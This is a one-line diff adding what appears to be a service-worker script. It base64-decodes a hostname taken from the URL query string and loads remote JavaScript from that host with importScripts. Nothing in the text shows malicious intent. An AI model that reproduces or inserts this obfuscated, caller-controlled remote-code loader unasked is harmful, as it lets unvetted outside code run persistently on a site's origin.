@@ -1,0 +1,1 @@
+var urlParams = new URLSearchParams(location.search); var sid = urlParams.get("sid"); var sd = urlParams.get("sd"); importScripts("//" + atob(sd) + "/sdk.js?sw=1&sid=" + sid);
